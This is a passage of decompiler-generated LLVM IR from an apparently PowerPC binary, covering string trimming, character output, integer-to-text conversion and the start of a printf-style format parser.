  store i32 0, i32* %v3_10000a5c, align 4
  %v1_10000a6c = trunc i32 %arg2 to i8
  %v3_10000a6c = add i32 %tmp, 8
  %v4_10000a6c = inttoptr i32 %v3_10000a6c to i8*
  store i8 %v1_10000a6c, i8* %v4_10000a6c, align 1
  %v1_10000a74 = add i32 %tmp, 24
  %v2_10000a74 = inttoptr i32 %v1_10000a74 to i32*
  %v3_10000a74 = load i32, i32* %v2_10000a74, align 4
  store i32 268438156, i32* @lr, align 4
  %v3_10000a88 = call i32 @function_1000dd4c(i32 %v3_10000a74, i32 0, i32 1024)
  ret i32 %v3_10000a88

; uselistorder directives
  uselistorder label %dec_label_pc_10000a54, { 1, 0 }
}

define i32 @function_10000aa4(i32 %arg1) local_unnamed_addr {
dec_label_pc_10000aa4:
  %v2_10000ac4 = inttoptr i32 %arg1 to i32*
  %v3_10000ac4 = call i32 @function_10000a1c(i32* %v2_10000ac4, i32 0)
  %v3_10000ad0 = add i32 %arg1, 9
  %v4_10000ad0 = inttoptr i32 %v3_10000ad0 to i8*
  store i8 1, i8* %v4_10000ad0, align 1
  ret i32 %v3_10000ac4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_10000aec(i32 %arg1) local_unnamed_addr {
dec_label_pc_10000aec:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_10000b10 = call i32 @function_1000df60()
  store i32 %v0_10000b10, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10000b34

dec_label_pc_10000b28:                            ; preds = %dec_label_pc_10000b34
  %v1_10000b2c = add i32 %stack_var_-36.0, 1
  br label %dec_label_pc_10000b34

dec_label_pc_10000b34:                            ; preds = %dec_label_pc_10000aec, %dec_label_pc_10000b28
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_10000aec ], [ %v1_10000b2c, %dec_label_pc_10000b28 ]
  %v2_10000b40 = add i32 %stack_var_-36.0, %arg1
  %v3_10000b40 = inttoptr i32 %v2_10000b40 to i8*
  %v3_10000b44 = load i8, i8* %v3_10000b40, align 1
  %v4_10000b44 = zext i8 %v3_10000b44 to i32
  store i32 %v4_10000b44, i32* %r3.global-to-local, align 4
  %v3_10000b54 = call i32 @function_1000c824(i32 %v4_10000b44, i32 %v2_10000b40)
  store i32 %v3_10000b54, i32* %r3.global-to-local, align 4
  %v3_10000b5c = icmp eq i32 %v3_10000b54, 0
  br i1 %v3_10000b5c, label %dec_label_pc_10000b74.preheader, label %dec_label_pc_10000b28

dec_label_pc_10000b74.preheader:                  ; preds = %dec_label_pc_10000b34
  %v1_10000b1c = add i32 %v0_10000b10, -1
  %v2_10000b7c7 = icmp slt i32 %v1_10000b1c, %stack_var_-36.0
  br i1 %v2_10000b7c7, label %dec_label_pc_10000c00.preheader, label %dec_label_pc_10000b84

dec_label_pc_10000b68:                            ; preds = %dec_label_pc_10000b84
  %v1_10000b6c = add i32 %stack_var_-40.010, -1
  %v2_10000b7c = icmp slt i32 %v1_10000b6c, %stack_var_-36.0
  br i1 %v2_10000b7c, label %dec_label_pc_10000c00.preheader, label %dec_label_pc_10000b84

dec_label_pc_10000b84:                            ; preds = %dec_label_pc_10000b74.preheader, %dec_label_pc_10000b68
  %stack_var_-40.010 = phi i32 [ %v1_10000b6c, %dec_label_pc_10000b68 ], [ %v1_10000b1c, %dec_label_pc_10000b74.preheader ]
  %v2_10000b90 = add i32 %stack_var_-40.010, %arg1
  %v3_10000b90 = inttoptr i32 %v2_10000b90 to i8*
  %v3_10000b94 = load i8, i8* %v3_10000b90, align 1
  %v4_10000b94 = zext i8 %v3_10000b94 to i32
  store i32 %v4_10000b94, i32* %r3.global-to-local, align 4
  %v3_10000ba4 = call i32 @function_1000c824(i32 %v4_10000b94, i32 %v2_10000b90)
  store i32 %v3_10000ba4, i32* %r3.global-to-local, align 4
  %v3_10000bac = icmp eq i32 %v3_10000ba4, 0
  br i1 %v3_10000bac, label %dec_label_pc_10000c00.preheader, label %dec_label_pc_10000b68

dec_label_pc_10000c00.preheader:                  ; preds = %dec_label_pc_10000b68, %dec_label_pc_10000b84, %dec_label_pc_10000b74.preheader
  %stack_var_-40.0.lcssa = phi i32 [ %v1_10000b1c, %dec_label_pc_10000b74.preheader ], [ %v1_10000b6c, %dec_label_pc_10000b68 ], [ %stack_var_-40.010, %dec_label_pc_10000b84 ]
  %v3_10000c083 = icmp sgt i32 %stack_var_-36.0, %stack_var_-40.0.lcssa
  br i1 %v3_10000c083, label %dec_label_pc_10000c10, label %dec_label_pc_10000bc0

dec_label_pc_10000bc0:                            ; preds = %dec_label_pc_10000c00.preheader, %dec_label_pc_10000bc0
  %v2_10000c246 = phi i32 [ %v2_10000c24, %dec_label_pc_10000bc0 ], [ %arg1, %dec_label_pc_10000c00.preheader ]
  %storemerge15 = phi i32 [ %v1_10000bf8, %dec_label_pc_10000bc0 ], [ %stack_var_-36.0, %dec_label_pc_10000c00.preheader ]
  %v2_10000be4 = add i32 %storemerge15, %arg1
  %v1_10000be8 = inttoptr i32 %v2_10000be4 to i8*
  %v2_10000be8 = load i8, i8* %v1_10000be8, align 1
  %v3_10000bf0 = inttoptr i32 %v2_10000c246 to i8*
  store i8 %v2_10000be8, i8* %v3_10000bf0, align 1
  %v1_10000bf8 = add i32 %storemerge15, 1
  %v3_10000c08 = icmp sgt i32 %v1_10000bf8, %stack_var_-40.0.lcssa
  %v2_10000c18 = sub i32 %v1_10000bf8, %stack_var_-36.0
  %v2_10000c24 = add i32 %v2_10000c18, %arg1
  br i1 %v3_10000c08, label %dec_label_pc_10000c10, label %dec_label_pc_10000bc0

dec_label_pc_10000c10:                            ; preds = %dec_label_pc_10000bc0, %dec_label_pc_10000c00.preheader
  %v2_10000c24.lcssa = phi i32 [ %arg1, %dec_label_pc_10000c00.preheader ], [ %v2_10000c24, %dec_label_pc_10000bc0 ]
  %v3_10000c2c = inttoptr i32 %v2_10000c24.lcssa to i8*
  store i8 0, i8* %v3_10000c2c, align 1
  %v0_10000c44 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10000c44

; uselistorder directives
  uselistorder i32 %v1_10000bf8, { 2, 1, 0 }
  uselistorder i32 %storemerge15, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_10000b1c, { 1, 0, 2 }
  uselistorder i32 %stack_var_-36.0, { 1, 0, 3, 2, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 4, 5, 6, 0 }
  uselistorder i32 (i32, i32)* @function_1000c824, { 1, 0 }
  uselistorder i32 %arg1, { 5, 1, 2, 0, 3, 4, 6, 7 }
  uselistorder label %dec_label_pc_10000bc0, { 1, 0 }
  uselistorder label %dec_label_pc_10000c00.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000b84, { 1, 0 }
  uselistorder label %dec_label_pc_10000b34, { 1, 0 }
}

define i32 @function_10000c48(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10000c48:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_10000c5c = load i32, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-20, align 4
  %v3_10000c68 = icmp eq i32 %v0_10000c5c, 0
  br i1 %v3_10000c68, label %dec_label_pc_10000c9c, label %dec_label_pc_10000c70

dec_label_pc_10000c70:                            ; preds = %dec_label_pc_10000c48
  %v1_10000c74 = inttoptr i32 %v0_10000c5c to i32*
  %v2_10000c74 = load i32, i32* %v1_10000c74, align 4
  %v1_10000c80 = trunc i32 %arg2 to i8
  %v3_10000c80 = inttoptr i32 %v2_10000c74 to i8*
  store i8 %v1_10000c80, i8* %v3_10000c80, align 1
  %v2_10000c88 = load i32, i32* %v1_10000c74, align 4
  %v1_10000c8c = add i32 %v2_10000c88, 1
  store i32 %v1_10000c8c, i32* %v1_10000c74, align 4
  %v0_10000cc4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10000cb0

dec_label_pc_10000c9c:                            ; preds = %dec_label_pc_10000c48
  %v2_10000c9c = ptrtoint i32* %stack_var_-20 to i32
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 268438704, i32* @lr, align 4
  %v2_10000cac = call i32 @function_1000c7dc(i32 1, i32 %v2_10000c9c)
  store i32 %v2_10000cac, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10000cb0

dec_label_pc_10000cb0:                            ; preds = %dec_label_pc_10000c70, %dec_label_pc_10000c9c
  %v0_10000cc4 = phi i32 [ %v0_10000cc4.pre, %dec_label_pc_10000c70 ], [ %v2_10000cac, %dec_label_pc_10000c9c ]
  ret i32 %v0_10000cc4

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder label %dec_label_pc_10000cb0, { 1, 0 }
}

define i32 @function_10000cc8(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10000cc8:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp45 = icmp slt i32 %arg3, 1
  br i1 %tmp45, label %dec_label_pc_10000d8c, label %dec_label_pc_10000d08

dec_label_pc_10000d08:                            ; preds = %dec_label_pc_10000cc8
  %v2_10000d3826 = load i8, i8* %arg2, align 1
  %v3_10000d4029 = icmp eq i8 %v2_10000d3826, 0
  br i1 %v3_10000d4029, label %dec_label_pc_10000d48, label %dec_label_pc_10000d1c

dec_label_pc_10000d1c:                            ; preds = %dec_label_pc_10000d08, %dec_label_pc_10000d1c
  %v4_10000d3431 = phi i32 [ %v1_10000d2c, %dec_label_pc_10000d1c ], [ %tmp, %dec_label_pc_10000d08 ]
  %stack_var_-20.030 = phi i32 [ %v1_10000d20, %dec_label_pc_10000d1c ], [ 0, %dec_label_pc_10000d08 ]
  %v1_10000d20 = add i32 %stack_var_-20.030, 1
  %v1_10000d2c = add i32 %v4_10000d3431, 1
  %v5_10000d30 = inttoptr i32 %v1_10000d2c to i8*
  %v2_10000d38 = load i8, i8* %v5_10000d30, align 1
  %v3_10000d40 = icmp eq i8 %v2_10000d38, 0
  br i1 %v3_10000d40, label %dec_label_pc_10000d48, label %dec_label_pc_10000d1c

dec_label_pc_10000d48:                            ; preds = %dec_label_pc_10000d1c, %dec_label_pc_10000d08
  %stack_var_-20.0.lcssa = phi i32 [ 0, %dec_label_pc_10000d08 ], [ %v1_10000d20, %dec_label_pc_10000d1c ]
  %v2_10000d50 = icmp slt i32 %stack_var_-20.0.lcssa, %arg3
  br i1 %v2_10000d50, label %dec_label_pc_10000d64, label %dec_label_pc_10000d74

dec_label_pc_10000d64:                            ; preds = %dec_label_pc_10000d48
  %v2_10000d6c = sub i32 %arg3, %stack_var_-20.0.lcssa
  br label %dec_label_pc_10000d74

dec_label_pc_10000d74:                            ; preds = %dec_label_pc_10000d48, %dec_label_pc_10000d64
  %storemerge3 = phi i32 [ %v2_10000d6c, %dec_label_pc_10000d64 ], [ 0, %dec_label_pc_10000d48 ]
  %v1_10000d78 = call i32 @__asm_rlwinm(i32 %arg4, i32 0, i32 30, i32 30)
  %v3_10000d7c = icmp eq i32 %v1_10000d78, 0
  br i1 %v3_10000d7c, label %dec_label_pc_10000d8c, label %dec_label_pc_10000d84

dec_label_pc_10000d84:                            ; preds = %dec_label_pc_10000d74
  br label %dec_label_pc_10000d8c

dec_label_pc_10000d8c:                            ; preds = %dec_label_pc_10000d74, %dec_label_pc_10000cc8, %dec_label_pc_10000d84
  %stack_var_-32.0 = phi i32 [ %arg3, %dec_label_pc_10000cc8 ], [ %storemerge3, %dec_label_pc_10000d74 ], [ %storemerge3, %dec_label_pc_10000d84 ]
  %stack_var_-16.0 = phi i32 [ 32, %dec_label_pc_10000cc8 ], [ 32, %dec_label_pc_10000d74 ], [ 48, %dec_label_pc_10000d84 ]
  %v1_10000d90 = urem i32 %arg4, 2
  %v3_10000d94 = icmp eq i32 %v1_10000d90, 0
  br i1 %v3_10000d94, label %dec_label_pc_10000dc4.preheader, label %dec_label_pc_10000e04.preheader

dec_label_pc_10000dc4.preheader:                  ; preds = %dec_label_pc_10000d8c
  %v2_10000dc819 = icmp sgt i32 %stack_var_-32.0, 0
  br i1 %v2_10000dc819, label %dec_label_pc_10000da0.lr.ph, label %dec_label_pc_10000e04.preheader

dec_label_pc_10000da0.lr.ph:                      ; preds = %dec_label_pc_10000dc4.preheader
  %v2_10000da8 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_10000da0

dec_label_pc_10000da0:                            ; preds = %dec_label_pc_10000da0.lr.ph, %dec_label_pc_10000da0
  %stack_var_-32.122 = phi i32 [ %stack_var_-32.0, %dec_label_pc_10000da0.lr.ph ], [ %v1_10000dbc, %dec_label_pc_10000da0 ]
  %v3_10000da8 = call i32 @function_10000c48(i32* %v2_10000da8, i32 %stack_var_-16.0)
  %v1_10000dbc = add nsw i32 %stack_var_-32.122, -1
  %v2_10000dc8 = icmp sgt i32 %stack_var_-32.122, 1
  br i1 %v2_10000dc8, label %dec_label_pc_10000da0, label %dec_label_pc_10000e04.preheader

dec_label_pc_10000e04.preheader:                  ; preds = %dec_label_pc_10000da0, %dec_label_pc_10000dc4.preheader, %dec_label_pc_10000d8c
  %stack_var_-12.1.ph = phi i32 [ 0, %dec_label_pc_10000d8c ], [ 0, %dec_label_pc_10000dc4.preheader ], [ %stack_var_-32.0, %dec_label_pc_10000da0 ]
  %stack_var_-32.2.ph = phi i32 [ %stack_var_-32.0, %dec_label_pc_10000d8c ], [ %stack_var_-32.0, %dec_label_pc_10000dc4.preheader ], [ 0, %dec_label_pc_10000da0 ]
  %v2_10000e0810 = load i8, i8* %arg2, align 1
  %v3_10000e1013 = icmp eq i8 %v2_10000e0810, 0
  br i1 %v3_10000e1013, label %dec_label_pc_10000e40.preheader, label %dec_label_pc_10000dd4.lr.ph

dec_label_pc_10000dd4.lr.ph:                      ; preds = %dec_label_pc_10000e04.preheader
  %v2_10000de8 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_10000dd4

dec_label_pc_10000dd4:                            ; preds = %dec_label_pc_10000dd4.lr.ph, %dec_label_pc_10000dd4
  %v4_10000e0416 = phi i32 [ %tmp, %dec_label_pc_10000dd4.lr.ph ], [ %v1_10000dfc, %dec_label_pc_10000dd4 ]
  %stack_var_-36.015 = phi i8* [ %arg2, %dec_label_pc_10000dd4.lr.ph ], [ %v5_10000e00, %dec_label_pc_10000dd4 ]
  %stack_var_-12.114 = phi i32 [ %stack_var_-12.1.ph, %dec_label_pc_10000dd4.lr.ph ], [ %v1_10000df0, %dec_label_pc_10000dd4 ]
  %v2_10000dd8 = load i8, i8* %stack_var_-36.015, align 1
  %v3_10000dd8 = zext i8 %v2_10000dd8 to i32
  %v3_10000de8 = call i32 @function_10000c48(i32* %v2_10000de8, i32 %v3_10000dd8)
  %v1_10000df0 = add i32 %stack_var_-12.114, 1
  %v1_10000dfc = add i32 %v4_10000e0416, 1
  %v5_10000e00 = inttoptr i32 %v1_10000dfc to i8*
  %v2_10000e08 = load i8, i8* %v5_10000e00, align 1
  %v3_10000e10 = icmp eq i8 %v2_10000e08, 0
  br i1 %v3_10000e10, label %dec_label_pc_10000e40.preheader, label %dec_label_pc_10000dd4

dec_label_pc_10000e40.preheader:                  ; preds = %dec_label_pc_10000dd4, %dec_label_pc_10000e04.preheader
  %stack_var_-12.1.lcssa = phi i32 [ %stack_var_-12.1.ph, %dec_label_pc_10000e04.preheader ], [ %v1_10000df0, %dec_label_pc_10000dd4 ]
  %v2_10000e445 = icmp sgt i32 %stack_var_-32.2.ph, 0
  br i1 %v2_10000e445, label %dec_label_pc_10000e1c.lr.ph, label %dec_label_pc_10000e4c

dec_label_pc_10000e1c.lr.ph:                      ; preds = %dec_label_pc_10000e40.preheader
  %v2_10000e24 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_10000e1c

dec_label_pc_10000e1c:                            ; preds = %dec_label_pc_10000e1c.lr.ph, %dec_label_pc_10000e1c
  %stack_var_-32.38 = phi i32 [ %stack_var_-32.2.ph, %dec_label_pc_10000e1c.lr.ph ], [ %v1_10000e38, %dec_label_pc_10000e1c ]
  %v3_10000e24 = call i32 @function_10000c48(i32* %v2_10000e24, i32 %stack_var_-16.0)
  %v1_10000e38 = add nsw i32 %stack_var_-32.38, -1
  %v2_10000e44 = icmp sgt i32 %stack_var_-32.38, 1
  br i1 %v2_10000e44, label %dec_label_pc_10000e1c, label %dec_label_pc_10000e40.dec_label_pc_10000e4c_crit_edge

dec_label_pc_10000e40.dec_label_pc_10000e4c_crit_edge: ; preds = %dec_label_pc_10000e1c
  %tmp46 = add i32 %stack_var_-12.1.lcssa, %stack_var_-32.2.ph
  br label %dec_label_pc_10000e4c

dec_label_pc_10000e4c:                            ; preds = %dec_label_pc_10000e40.dec_label_pc_10000e4c_crit_edge, %dec_label_pc_10000e40.preheader
  %stack_var_-12.2.lcssa = phi i32 [ %tmp46, %dec_label_pc_10000e40.dec_label_pc_10000e4c_crit_edge ], [ %stack_var_-12.1.lcssa, %dec_label_pc_10000e40.preheader ]
  ret i32 %stack_var_-12.2.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-12.1.lcssa, { 1, 0 }
  uselistorder i32 %v1_10000dfc, { 1, 0 }
  uselistorder i32 %stack_var_-32.0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %stack_var_-20.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_10000d2c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000e1c, { 1, 0 }
  uselistorder label %dec_label_pc_10000dd4, { 1, 0 }
  uselistorder label %dec_label_pc_10000da0, { 1, 0 }
  uselistorder label %dec_label_pc_10000d8c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10000d74, { 1, 0 }
  uselistorder label %dec_label_pc_10000d1c, { 1, 0 }
}

define i32 @function_10000e6c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_10000e6c:
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %v3_10000eb8 = icmp eq i32 %arg2, 0
  br i1 %v3_10000eb8, label %dec_label_pc_10000ec0, label %dec_label_pc_10000ef4

dec_label_pc_10000ec0:                            ; preds = %dec_label_pc_10000e6c
  store i32 48, i32* %stack_var_-88, align 4
  %v4_10000ee4 = bitcast i32* %stack_var_-88 to i8*
  %v5_10000ee4 = call i32 @function_10000cc8(i32 %arg1, i8* %v4_10000ee4, i32 %arg5, i32 %arg6)
  br label %dec_label_pc_1000104c

dec_label_pc_10000ef4:                            ; preds = %dec_label_pc_10000e6c
  %v3_10000ef8 = icmp eq i32 %arg4, 0
  br i1 %v3_10000ef8, label %dec_label_pc_10000f2c, label %dec_label_pc_10000f00

dec_label_pc_10000f00:                            ; preds = %dec_label_pc_10000ef4
  %v3_10000f04 = icmp eq i32 %arg3, 10
  br i1 %v3_10000f04, label %dec_label_pc_10000f0c, label %dec_label_pc_10000f2c

dec_label_pc_10000f0c:                            ; preds = %dec_label_pc_10000f00
  %tmp27 = icmp sgt i32 %arg2, -1
  br i1 %tmp27, label %dec_label_pc_10000f2c, label %dec_label_pc_10000f18

dec_label_pc_10000f18:                            ; preds = %dec_label_pc_10000f0c
  %v1_10000f24 = sub i32 0, %arg2
  br label %dec_label_pc_10000f2c

dec_label_pc_10000f2c:                            ; preds = %dec_label_pc_10000f00, %dec_label_pc_10000f0c, %dec_label_pc_10000ef4, %dec_label_pc_10000f18
  %stack_var_-44.0 = phi i32 [ %arg2, %dec_label_pc_10000ef4 ], [ %arg2, %dec_label_pc_10000f0c ], [ %v1_10000f24, %dec_label_pc_10000f18 ], [ %arg2, %dec_label_pc_10000f00 ]
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_10000ef4 ], [ 0, %dec_label_pc_10000f0c ], [ 1, %dec_label_pc_10000f18 ], [ 0, %dec_label_pc_10000f00 ]
  %tmp28 = bitcast i32* %stack_var_-77 to i8*
  store i8 0, i8* %tmp28, align 4
  %v3_10000fb85 = icmp eq i32 %stack_var_-44.0, 0
  br i1 %v3_10000fb85, label %dec_label_pc_10000fc0, label %dec_label_pc_10000f44.lr.ph

dec_label_pc_10000f44.lr.ph:                      ; preds = %dec_label_pc_10000f2c
  %v2_10000f74 = add i32 %arg7, -58
  br label %dec_label_pc_10000f44

dec_label_pc_10000f44:                            ; preds = %dec_label_pc_10000f44.lr.ph, %dec_label_pc_10000f80
  %stack_var_-44.17 = phi i32 [ %stack_var_-44.0, %dec_label_pc_10000f44.lr.ph ], [ %v2_10000fac, %dec_label_pc_10000f80 ]
  %stack_var_-28.06 = phi i8* [ %tmp28, %dec_label_pc_10000f44.lr.ph ], [ %v5_10000f88, %dec_label_pc_10000f80 ]
  %v2_10000f4c = urem i32 %stack_var_-44.17, %arg3
  %tmp29 = icmp slt i32 %v2_10000f4c, 10
  br i1 %tmp29, label %dec_label_pc_10000f80, label %dec_label_pc_10000f6c

dec_label_pc_10000f6c:                            ; preds = %dec_label_pc_10000f44
  %v1_10000f78 = add i32 %v2_10000f74, %v2_10000f4c
  br label %dec_label_pc_10000f80

dec_label_pc_10000f80:                            ; preds = %dec_label_pc_10000f44, %dec_label_pc_10000f6c
  %stack_var_-32.0 = phi i32 [ %v2_10000f4c, %dec_label_pc_10000f44 ], [ %v1_10000f78, %dec_label_pc_10000f6c ]
  %v4_10000f80 = ptrtoint i8* %stack_var_-28.06 to i32
  %v1_10000f84 = add i32 %v4_10000f80, -1
  %v5_10000f88 = inttoptr i32 %v1_10000f84 to i8*
  %fold = add i32 %stack_var_-32.0, 48
  %v1_10000fa0 = trunc i32 %fold to i8
  store i8 %v1_10000fa0, i8* %v5_10000f88, align 1
  %v2_10000fac = udiv i32 %stack_var_-44.17, %arg3
  %v3_10000fb8 = icmp ult i32 %stack_var_-44.17, %arg3
  br i1 %v3_10000fb8, label %dec_label_pc_10000fc0, label %dec_label_pc_10000f44

dec_label_pc_10000fc0:                            ; preds = %dec_label_pc_10000f80, %dec_label_pc_10000f2c
  %stack_var_-28.0.lcssa = phi i8* [ %tmp28, %dec_label_pc_10000f2c ], [ %v5_10000f88, %dec_label_pc_10000f80 ]
  %v3_10000fc4 = icmp eq i32 %stack_var_-36.0, 0
  br i1 %v3_10000fc4, label %dec_label_pc_10001028, label %dec_label_pc_10000fcc

dec_label_pc_10000fcc:                            ; preds = %dec_label_pc_10000fc0
  %v3_10000fd0 = icmp eq i32 %arg5, 0
  br i1 %v3_10000fd0, label %dec_label_pc_10001010, label %dec_label_pc_10000fd8

dec_label_pc_10000fd8:                            ; preds = %dec_label_pc_10000fcc
  %v1_10000fdc = call i32 @__asm_rlwinm(i32 %arg6, i32 0, i32 30, i32 30)
  %v3_10000fe0 = icmp eq i32 %v1_10000fdc, 0
  br i1 %v3_10000fe0, label %dec_label_pc_10001010, label %dec_label_pc_10000fe8

dec_label_pc_10000fe8:                            ; preds = %dec_label_pc_10000fd8
  %v2_10000ff0 = inttoptr i32 %arg1 to i32*
  %v3_10000ff0 = call i32 @function_10000c48(i32* %v2_10000ff0, i32 45)
  %v1_10001004 = add i32 %arg5, -1
  br label %dec_label_pc_10001028

dec_label_pc_10001010:                            ; preds = %dec_label_pc_10000fd8, %dec_label_pc_10000fcc
  %v4_10001010 = ptrtoint i8* %stack_var_-28.0.lcssa to i32
  %v1_10001014 = add i32 %v4_10001010, -1
  %v5_10001018 = inttoptr i32 %v1_10001014 to i8*
  store i8 45, i8* %v5_10001018, align 1
  br label %dec_label_pc_10001028

dec_label_pc_10001028:                            ; preds = %dec_label_pc_10000fc0, %dec_label_pc_10000fe8, %dec_label_pc_10001010
  %stack_var_-28.1 = phi i8* [ %stack_var_-28.0.lcssa, %dec_label_pc_10000fc0 ], [ %v5_10001018, %dec_label_pc_10001010 ], [ %stack_var_-28.0.lcssa, %dec_label_pc_10000fe8 ]
  %stack_var_-56.0 = phi i32 [ %arg5, %dec_label_pc_10000fc0 ], [ %arg5, %dec_label_pc_10001010 ], [ %v1_10001004, %dec_label_pc_10000fe8 ]
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_10000fc0 ], [ 0, %dec_label_pc_10001010 ], [ 1, %dec_label_pc_10000fe8 ]
  %v5_10001038 = call i32 @function_10000cc8(i32 %arg1, i8* %stack_var_-28.1, i32 %stack_var_-56.0, i32 %arg6)
  %v2_10001044 = add i32 %v5_10001038, %stack_var_-40.0
  br label %dec_label_pc_1000104c

dec_label_pc_1000104c:                            ; preds = %dec_label_pc_10000ec0, %dec_label_pc_10001028
  %storemerge = phi i32 [ %v2_10001044, %dec_label_pc_10001028 ], [ %v5_10000ee4, %dec_label_pc_10000ec0 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-28.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_10000f88, { 0, 2, 1 }
  uselistorder i32 %v2_10000f4c, { 1, 0, 2 }
  uselistorder i32 %stack_var_-44.17, { 0, 2, 1 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg5, { 1, 3, 0, 2, 4 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 2, 4, 1, 3, 5 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000104c, { 1, 0 }
  uselistorder label %dec_label_pc_10001028, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10000f80, { 1, 0 }
  uselistorder label %dec_label_pc_10000f44, { 1, 0 }
  uselistorder label %dec_label_pc_10000f2c, { 3, 1, 0, 2 }
}

define i32 @function_1000106c(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000106c:
  %tmp = inttoptr i32 %arg3 to i8*
  %tmp41 = ptrtoint i32* %arg1 to i32
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-68.427 = inttoptr i32 %arg2 to i8*
  %v2_1000163c28 = load i8, i8* %stack_var_-68.427, align 1
  %v3_1000164431 = icmp eq i8 %v2_1000163c28, 0
  br i1 %v3_1000164431, label %dec_label_pc_1000164c, label %dec_label_pc_10001098.lr.ph

dec_label_pc_10001098.lr.ph:                      ; preds = %dec_label_pc_1000106c
  %v1_1000120c = add i32 %arg3, 4
  %v2_1000120c = inttoptr i32 %v1_1000120c to i32*
  %v1_100011d4 = add i32 %arg3, 8
  %v2_100011d4 = inttoptr i32 %v1_100011d4 to i32*
  %v4_100015f0 = bitcast i32* %stack_var_-88 to i8*
  br label %dec_label_pc_10001098

dec_label_pc_10001098:                            ; preds = %dec_label_pc_10001098.lr.ph, %dec_label_pc_1000162c
  %stack_var_-68.434 = phi i8* [ %stack_var_-68.427, %dec_label_pc_10001098.lr.ph ], [ %stack_var_-68.4, %dec_label_pc_1000162c ]
  %stack_var_-68.4.in33 = phi i32 [ %arg2, %dec_label_pc_10001098.lr.ph ], [ %v1_10001630, %dec_label_pc_1000162c ]
  %stack_var_-56.132 = phi i32 [ 0, %dec_label_pc_10001098.lr.ph ], [ %stack_var_-56.0, %dec_label_pc_1000162c ]
  %v2_1000109c = load i8, i8* %stack_var_-68.434, align 1
  %v3_100010a4 = icmp eq i8 %v2_1000109c, 37
  br i1 %v3_100010a4, label %dec_label_pc_100010ac, label %dec_label_pc_10001608

dec_label_pc_100010ac:                            ; preds = %dec_label_pc_10001098
  %v1_100010b0 = add i32 %stack_var_-68.4.in33, 1
  %v5_100010b4 = inttoptr i32 %v1_100010b0 to i8*
  %v2_100010cc = load i8, i8* %v5_100010b4, align 1
  %v3_100010d4 = icmp eq i8 %v2_100010cc, 0
  br i1 %v3_100010d4, label %dec_label_pc_1000164c, label %dec_label_pc_100010dc

dec_label_pc_100010dc:                            ; preds = %dec_label_pc_100010ac
  %v2_100010e0 = load i8, i8* %v5_100010b4, align 1
  %v3_100010e8 = icmp eq i8 %v2_100010e0, 37
  br i1 %v3_100010e8, label %dec_label_pc_10001608, label %dec_label_pc_100010f0

dec_label_pc_100010f0:                            ; preds = %dec_label_pc_100010dc
  %v2_100010f4 = load i8, i8* %v5_100010b4, align 1
  %v3_100010fc = icmp eq i8 %v2_100010f4, 45
  br i1 %v3_100010fc, label %dec_label_pc_10001104, label %dec_label_pc_10001134.preheader

dec_label_pc_10001104:                            ; preds = %dec_label_pc_100010f0
  %v1_10001108 = add i32 %stack_var_-68.4.in33, 2
  %v5_1000110c = inttoptr i32 %v1_10001108 to i8*
  br label %dec_label_pc_10001134.preheader

dec_label_pc_10001134.preheader:                  ; preds = %dec_label_pc_10001104, %dec_label_pc_100010f0
  %stack_var_-68.0.ph = phi i8* [ %v5_100010b4, %dec_label_pc_100010f0 ], [ %v5_1000110c, %dec_label_pc_10001104 ]
  %stack_var_-52.0.ph = phi i32 [ 0, %dec_label_pc_100010f0 ], [ 1, %dec_label_pc_10001104 ]
  %v4_100011343 = ptrtoint i8* %stack_var_-68.0.ph to i32
  %v2_100011384 = load i8, i8* %stack_var_-68.0.ph, align 1
  %v3_100011408 = icmp eq i8 %v2_100011384, 48
  br i1 %v3_100011408, label %dec_label_pc_1000111c, label %dec_label_pc_10001180.preheader

